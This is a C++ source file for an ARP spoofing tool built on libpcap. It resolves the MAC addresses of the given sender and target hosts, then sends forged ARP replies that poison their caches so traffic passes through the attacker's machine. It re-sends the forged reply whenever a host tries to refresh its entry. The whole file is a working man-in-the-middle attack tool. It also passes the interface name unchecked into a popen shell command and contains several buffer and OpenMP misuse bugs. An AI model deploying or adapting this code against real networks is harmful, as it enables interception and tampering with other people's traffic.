//          Copyright Joe Coder 2004 - 2006.
// Distributed under the Boost Software License, Version 1.0.
//    (See accompanying file LICENSE_1_0.txt or copy at
//          https://www.boost.org/LICENSE_1_0.txt)

#include <pcap.h>
#include <stdio.h>			//printf(), BUFSIZ
#include <arpa/inet.h>			//inet_ntop()
#include <cstring>			//memcmp(), strncpy()
#include <net/ethernet.h>		//struct ether_header, ETHERTYPE
#include <netinet/ip.h>			//struct ip, IPPROTO
#include <netinet/tcp.h>		//struct tcphdr
#include <sys/ioctl.h>			//ioctl()
#include <net/if.h>			//struct ifreq
#include <omp.h>			//OpenMP
#include <boost/thread/thread.hpp>	//boost::thread
#include <boost/chrono/chrono.hpp>	//boost::chrono
#include <boost/noncopyable.hpp>	//boost::noncopyable
#include <boost/move/unique_ptr.hpp>	//boost::unique_ptr
#include <boost/move/make_unique.hpp>	//boost::make_unique
#include "header.h"

using namespace boost::chrono;
using boost::movelib::unique_ptr;
using boost::movelib::make_unique;
using boost::chrono::steady_clock;
using boost::thread;

class Header : private boost::noncopyable {
	protected:
		virtual void print() = 0;
	public:
		Header() {};
		virtual ~Header() {};
};

class Ethhdr : protected Header {
	private:
		struct ether_header *ether;
	protected:
		void macprint(const uint8_t *src) {
			for(int i = 0; i < ETH_ALEN; i++)
				printf("%02X:", *(src + i));
			printf("\b \n");
		}
		void broadcast() {
			for(int i = 0; i < ETH_ALEN; i++)
				ether->ether_dhost[i] = 0xff;
		}
	public:
		Ethhdr() { this->ether = nullptr; }
		Ethhdr(const u_char **packet) {
			this->ether = (struct ether_header *)*packet;
		}
		~Ethhdr() override { this->ether = nullptr; }
		uint16_t getEthertype() { return ntohs(this->ether->ether_type); }
		void print() override {
			printf("Source MAC Address : ");
			macprint(ether->ether_shost);
			printf("Destination MAC Address : ");
			macprint(ether->ether_dhost);
			printf("Ether Type : %04x\n", getEthertype());
		}
		void ether_build(const uint8_t* const smac,
				const uint8_t* const tmac = nullptr) {
			if(tmac == nullptr)
				broadcast();
			else
				memcpy(this->ether->ether_dhost, tmac,
					sizeof(this->ether->ether_dhost));
			memcpy(this->ether->ether_shost, smac,
				sizeof(this->ether->ether_shost));
			this->ether->ether_type = htons(ETHERTYPE_ARP);
		}
};

class Iphdr : protected Header {
	private:
		const struct ip *ip;
	public:
		Iphdr() { this->ip = nullptr; }
		Iphdr(const u_char **packet) {
			this->ip = (const struct ip *)*packet;
			*packet += this->ip->ip_hl * 4;
		}
		~Iphdr() override { this->ip = nullptr; }
		void print() override;
		uint16_t getIplen() const { return ntohs(this->ip->ip_len); }
		uint8_t getIphl() const { return this->ip->ip_hl; }
		uint8_t getIpproto() const { return this->ip->ip_p; }
};

class Tcphdr : protected Header {
	private:
		const struct tcphdr *tcp;
	public:
		Tcphdr() { this->tcp = nullptr; }
		Tcphdr(const u_char **packet) {
			this->tcp = (const struct tcphdr *)*packet;
			*packet += getThoff() * 4;
		}
		~Tcphdr() override { this->tcp = nullptr; }
		void print() override {
			printf("Source Port Address : %d\n", getThsport());
			printf("Destination Port Address : %d\n", getThdport());
		}
		uint16_t getThsport() const { return ntohs(this->tcp->th_sport); }
		uint16_t getThdport() const { return ntohs(this->tcp->th_dport); }
		uint8_t getThoff() const { return this->tcp->th_off; }
};

class Httphdr : protected Header {
	private:
		const u_char *packet;
		uint8_t len;
	public:
		Httphdr() { this->packet = nullptr; }
		Httphdr(const Iphdr *ip, const Tcphdr *tcp,  const u_char **packet) {
			this->packet = *packet;
			this->len = ip->getIplen() - ip->getIphl() * 4 - tcp->getThoff() * 4;
		}
		~Httphdr() final { this->packet = nullptr; }
		bool Ishttp(uint8_t src, uint8_t dst) {
			if((src == 80 || dst == 80) && this->len) return true;
			else return false;
		}
		void print() final {
			if(this->len > 16)	this->len = 16;
			printf("Http Data : ");
			int i = 0;
			while(i < this->len)
				printf("%c", *(this->packet + i++));
			if(*(this->packet + --i) != '\n') putchar('\n');
		}
};

class Udphdr : protected Header {
	private:
		const struct udphdr *udp;
	protected:
		uint16_t getUhsport() { return ntohs(this->udp->uh_sport); }
		uint16_t getUhdport() { return ntohs(this->udp->uh_dport); }
	public:
		Udphdr() { this->udp = nullptr; }
		Udphdr(const u_char **packet) {
			this->udp = (struct udphdr *)*packet;
			*packet += sizeof(struct udphdr);
		}
		~Udphdr() override { this->udp = nullptr; }
		void print() override {
			printf("Source Port Address : %d\n", getUhsport());
			printf("Destination Port Address : %d\n", getUhdport());
		}
};

class Arphdr : protected Header {
	private:
		struct arphdr *arp;
	protected:
		void macprint(const uint8_t *src) {
			for(int i = 0; i < ETH_ALEN; i++)
				printf("%02X:", *(src + i));
			printf("\b \n");
		}
		void arp_request(const uint8_t* const smac) {
			memcpy(arp->ar_sha, smac, sizeof(arp->ar_sha));
			for(int i = 0; i < ETH_ALEN; i++)
				arp->ar_tha[i] = 0x00;
			arp->ar_op = htons(0x0001);	//Opcode request (1)
		}
		void arp_reply(const uint8_t* const smac,
		const uint8_t* const tmac) {
			memcpy(arp->ar_sha, smac, sizeof(arp->ar_sha));
			memcpy(arp->ar_tha, tmac, sizeof(arp->ar_sha));
			arp->ar_op = htons(0x0002);	//Opcode reply (2)
		}
	public:
		Arphdr() { arp = nullptr; }
		Arphdr(const u_char **packet) {
			arp = (struct arphdr *)(*packet + sizeof(ether_header));
		}
		~Arphdr() override { arp = nullptr; }
		uint16_t getOpcode() { return htons(arp->ar_op); }
		uint32_t getSip() { return htonl(arp->ar_sip.s_addr); }
		uint32_t getTip() { return htonl(arp->ar_tip.s_addr); }
		uint8_t* getSha() { return arp->ar_sha; }
		uint8_t* getTha() { return arp->ar_tha; }
		void print() override;
		void arp_build(struct in_addr* const sip, const uint8_t* const smac,
		struct in_addr* const tip, const uint8_t* const tmac);
};

void Iphdr::print() {
	char src_buf[16], dst_buf[16];

	inet_ntop(AF_INET, &this->ip->ip_src.s_addr, src_buf, sizeof(src_buf));
	inet_ntop(AF_INET, &this->ip->ip_dst.s_addr, dst_buf, sizeof(dst_buf));
	printf("Source IP Address : %s\n", src_buf);
	printf("Destination IP Address : %s\n", dst_buf);
}

void Arphdr::print() {
	char src_buf[16], dst_buf[16];

	inet_ntop(AF_INET, &this->arp->ar_sip.s_addr, src_buf, sizeof(src_buf));
	inet_ntop(AF_INET, &this->arp->ar_tip.s_addr, dst_buf, sizeof(dst_buf));
	printf("Opcode : %02x\n", this->getOpcode());
	printf("Sender MAC Address : ");
	macprint(arp->ar_sha);
	printf("Sender IP Address : %s\n", src_buf);
	printf("Target MAC Address : ");
	macprint(arp->ar_tha);
	printf("Target IP Address : %s\n", dst_buf);
}

void Arphdr::arp_build(struct in_addr* const sip, const uint8_t* const smac,
		struct in_addr* const tip, const uint8_t* const tmac = nullptr) {
	if(tmac == nullptr)
		this->arp_request(smac);
	else
		this->arp_reply(smac, tmac);
	arp->ar_hrd = htons(0x0001);	//0x0001 -> Ethernet
	arp->ar_pro = htons(0x0800);	//0x0800 -> IPv4(default)
	arp->ar_hln = 0x06;	//0x06 -> HA size
	arp->ar_pln = 0x04;	//0x04 -> PA size
	arp->ar_sip.s_addr = htonl(sip->s_addr);
	arp->ar_tip.s_addr = htonl(tip->s_addr);
}

void usage() {
	printf("syntax: adv_send_arp <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample: adv_send_arp wlan0 192.168.0.19 192.168.0.1 192.168.0.1 192.168.0.19\n");
}

int getinfo(const char* const name, struct in_addr* myip,
struct in_addr* gwip, uint8_t** const buf) {
	struct ifreq ifr;
	char src[16];
	struct in_addr tmp;
	FILE *fp = nullptr;
	char cmd[40];
	int s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	if(s < 0) {
		perror("Socket Open Failed");
		return -1;
	}
	
	strncpy(ifr.ifr_name, name, sizeof(name));

	//if name is error value, perror() will be called
	if(ioctl(s, SIOCGIFHWADDR, &ifr) >= 0) {
		memcpy(*buf, ifr.ifr_hwaddr.sa_data, sizeof(*buf));
	} else {
		close(s);
		perror("ioctl SIOCGIFHWADDR error");
		return -1;
	}

	if(ioctl(s, SIOCGIFADDR, &ifr) >= 0) {
		myip->s_addr = htonl((&((struct sockaddr_in *)&ifr.ifr_addr)
				->sin_addr)->s_addr);
		sprintf(cmd, "route -n | grep %s | awk '$4==\"UG\"{print $2}'", name);
		//snprintf -> second argument is size, but syntax error
		if((fp = popen(cmd, "r")) == NULL) {
			perror("popen() failed");
			return -1;
		}
		fgets(src, sizeof(src)/sizeof(src[0]), fp);
		fclose(fp);
		for(int i = sizeof(src)/sizeof(src[0]) + 1; --i;)
			if(src[i] == 0x0A) { src[i] = 0x00; break; }
		inet_pton(AF_INET, src, &tmp.s_addr);
		tmp.s_addr = htonl(tmp.s_addr);
		if(tmp.s_addr != gwip->s_addr)
			gwip->s_addr = tmp.s_addr;
	} else {
		close(s);
		perror("ioctl SIOCGIFADDR error");
		return -1;
	}
	
	close(s);
	return 0;
}

void send_packet(pcap_t** const handle,
const u_char** const packet, const int* const size) {
	if(pcap_sendpacket(*handle, *packet, *size) != 0)
		fprintf(stderr, "Error sending the packet\n");
}

void dump(const u_char** const packet, const int* const size) {
	for(int i = 0; i < *size; i++)
		printf("%02x ", *(*packet + i));
	putchar('\n');
}

void get_tinfo(pcap_t** const handle, const u_char **sent_packet,
uint8_t **mac, int *chk) {
	struct pcap_pkthdr *header;
	int res = 1;
	uint8_t *tmp = (uint8_t *)calloc(ETH_ALEN, sizeof(uint8_t));
	const u_char *packet;
	unique_ptr<Arphdr> sent_arp[chk[1]];

	#pragma omp for
	for(int i = 0; i < chk[1]; i++)
		sent_arp[i] = make_unique<Arphdr>(&sent_packet[i]);

/************************************************/
_ret:
/************************************************/
	steady_clock::time_point start = steady_clock::now();
	while((res = pcap_next_ex(*handle, &header, &packet)) >= 0) {
		if(res == 0) continue;

		#pragma omp parallel schedule(dynamic)
		{
			auto ether(make_unique<Ethhdr>(&packet));
			if(ether->getEthertype() == ETHERTYPE_ARP) {
				auto arp(make_unique<Arphdr>(&packet));
				uint32_t tip = arp->getTip();
				uint32_t sip = arp->getSip();
				uint32_t sent_tip[chk[1]];
				uint32_t sent_sip[chk[1]];
				#pragma omp for
				for(int i = 0; i < chk[1]; i++) {
					sent_tip[i] = sent_arp[i]->getTip();
					sent_sip[i] = sent_arp[i]->getSip();
				}
				
				#pragma omp for
				for(int i = 0; i < chk[1]; i++) {
					if((sent_arp[i]->getOpcode() == 2 && arp->getOpcode() == 1) &&
						(memcmp(&tip, &sent_sip[i], sizeof(tip)) == 0 &&
						memcmp(&sip, &sent_tip[i], sizeof(sip)) == 0)) {
						puts("ReInfacted");
			//printf("sip : %08x, tip : %08x, sent_tip[i] : %08x, sent_sip[i] = %08x\n",
			//sip, tip, sent_tip[i], sent_sip[i]);
						//dump(&sent_packet[i], &chk[2]);
						send_packet(handle, &sent_packet[i], &chk[2]);
						goto _ret; //_ret is at upper region
					}
					else if((sent_arp[i]->getOpcode() == 1 && arp->getOpcode() == 2) &&
						memcmp(&sent_tip[i], &sip, sizeof(sent_tip[0])) == 0) {
						memcpy(mac[i], arp->getSha(), sizeof(mac[0]));
						puts("Success");
			//for(int i = 0; i < chk[1]; i++)
			//printf("\n\nSender MAC Addr : %02x:%02x:%02x:%02x:%02x:%02x\n\n",
			//**(mac + i), *(*(mac + i) + 1), *(*(mac + i) + 2),
			//*(*(mac + i) + 3), *(*(mac + i) + 4), *(*(mac + i) + 5)); //for debugging
						if(++chk[0]  == chk[1])	return;
					}
				}
			}
			duration<double> used_time = steady_clock::now() - start;
			printf("%lf\n", used_time.count());
			//if -> lost ARP Request resend
			//elif -> time-out ARP Reply resend
			if(sent_arp[0]->getOpcode() == 1 &&
				used_time.count() >= 10.0) {
				#pragma omp for
				for(int i = 0; i < chk[1]; i++)
					if(memcmp(mac[i], tmp, sizeof(mac[i])) == 0) {
						send_packet(handle, &sent_packet[i], &chk[2]);
						goto _ret; //_ret is at get_tinfo()
					}
			} else if(sent_arp[0]->getOpcode() == 2 &&
				used_time.count() >= 25.0) {
				#pragma omp for
				for(int i = 0; i < chk[1]; i++) {
					send_packet(handle, &sent_packet[i], &chk[2]);
					goto _ret; //_ret is at get_tinfo()
				}
			}
		}
	}
}

int setPcap(pcap_t **handle, const char* const dev) {
	char errbuf[PCAP_ERRBUF_SIZE];

	if((*handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf)) == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	return 0;
}

int main(int argc, char* argv[]) {
	int size = sizeof(struct ether_header) + sizeof(struct arphdr);
	int max = (argc - 4) / 2 + 1;
	int check[3] = {0, max, size};

	uint8_t *mymac = (uint8_t *)calloc(ETH_ALEN, sizeof(uint8_t));
	uint8_t *gwmac = (uint8_t *)calloc(ETH_ALEN, sizeof(uint8_t));
	uint8_t *smac[max], *tmac[max];
	struct in_addr myip, gwip, sip[max], tip[max];
	pcap_t* handle = nullptr;
	const u_char *packet[max];
	unique_ptr<Ethhdr> ether[max];
	unique_ptr<Arphdr> arp[max];


	for(int i = 0; i < max; i++) {
		smac[i] = (uint8_t *)calloc(ETH_ALEN, sizeof(uint8_t));
		tmac[i] = (uint8_t *)calloc(ETH_ALEN, sizeof(uint8_t));
		packet[i] = (const u_char *)calloc(size, sizeof(const u_char));
		ether[i] = make_unique<Ethhdr>(&packet[i]);
		arp[i] = make_unique<Arphdr>(&packet[i]);
	}

	if(argc < 3 || argc % 2) {
		usage();
		goto _end;
	} else { 
		if(setPcap(&handle, argv[1]) == -1)
			goto _end;
		#define	NUM (i - 2) / 2
		for(int i = argc - 1; i > 1; i--)
			if(i % 2) {
				inet_pton(AF_INET, argv[i], &tip[NUM]);
				tip[NUM].s_addr = htonl(tip[NUM].s_addr);
				//printf("argv[%d] = Target %d IP : %08x\n", i, NUM, tip[NUM].s_addr);
			} else {
				inet_pton(AF_INET, argv[i], &sip[NUM]);
				sip[NUM].s_addr = htonl(sip[NUM].s_addr);
				//printf("argv[%d] = Sender %d IP : %08x\n", i, NUM, sip[NUM].s_addr);
			}
		#undef	NUM
	}

	if(getinfo(argv[1], &myip, &gwip, &mymac) == -1) {
		pcap_close(handle);
		goto _end;
	}

	//printf("My IP : %08x\n", myip.s_addr);
	//printf("Gw IP : %08x\n", gwip.s_addr);
	//printf("My MAC Addr : %02x:%02x:%02x:%02x:%02x:%02x\n",
	//	*mymac, *(mymac + 1), *(mymac + 2), *(mymac + 3),
	//	*(mymac + 4), *(mymac + 5)); //for debugging


/***************************************************************
	This routine will be made function required 7 parameters

	unique_ptr<Ethhdr> ether, unique_ptr<Arphdr> arp,
	const int *max, struct in_addr *sip, uint8_t **smac,
	struct in_addr *tip, uint8_t **tmac = nullptr

	example)
	unique_ptr<Ethhdr> ether[max];	-> remove
	unique_ptr<Arphdr> arp[max];	-> remove
	ether[i] = make_unique<Ethhdr>(&packet[i]); -> remove
	arp[i] = make_unique<Arphdr>(&packet[i]);   -> remove
	for(int i = 0; i < max; i++)	//Target Req
		//Sender Req -> tip to sip
		//Reply -> tip to sip, myip to tip,
		//	tmac insert, tmac to smac
		func(make_unique<Ethhdr>(&packet[i]),
			make_unique<Arphdr>(&packet[i]),
			max, &myip, mymac, &tip)
***************************************************************/
	
	for(int i = 0; i < max; i++) {	//Target Req
		ether[i]->ether_build(mymac);
		arp[i]->arp_build(&myip, mymac, &tip[i]);
		//ether[i]->print();
		//arp[i]->print();
		//putchar('\n');
	}

	{
		thread t([&max, &handle, &packet, &size] {
			for(int i = 0; i < max; i++)
				send_packet(&handle, &packet[i], &size);
		});

		get_tinfo(&handle, (const u_char **)packet, (uint8_t **)tmac, check);
		check[0] = 0;
		//if(t.joinable())	t.join();
	}
	
	for(int i = 0; i < max; i++) {	//Sender Req
		ether[i]->ether_build(mymac);
		arp[i]->arp_build(&myip, mymac, &sip[i]);
		//ether[i]->print();
		//arp[i]->print();
		//putchar('\n');
	}

	{
		thread t([&max, &handle, &packet, &size] {
			for(int i = 0; i < max; i++)
				send_packet(&handle, &packet[i], &size);
		});

		get_tinfo(&handle, (const u_char **)packet, (uint8_t **)smac, check);
		check[0] = 0;
		//if(t.joinable())	t.join();
	}

	
	for(int i = 0; i < max; i++) {	//Reply
		ether[i]->ether_build(mymac, smac[i]);
		arp[i]->arp_build(&tip[i], mymac, &sip[i], smac[i]);
		//ether[i]->print();
		//arp[i]->print();
		//putchar('\n');
	}
	
	{
		thread t([&max, &handle, &packet, &size] {
			for(int i = 0; i < max; i++) {
				send_packet(&handle, &packet[i], &size);
				//printf("Send packet[%d]\n", i);
			}
		});
		//while(1){
			//puts("get_tinfo() called");
			get_tinfo(&handle, (const u_char **)packet,
				(uint8_t **)tmac, check);
		//}
		//if(t.joinable())	t.join();
	}

	pcap_close(handle);

/************************************************/
_end:
/************************************************/
	for(int i = 0; i < max; i++) {
		free(tmac[i]);			free(smac[i]);
		free((void *)packet[i]);	packet[i] = nullptr;
		tmac[i] = nullptr;		smac[i] = nullptr;
	}
		free(mymac);			mymac = nullptr;
		free(gwmac);			gwmac = nullptr;

	return 0;
}
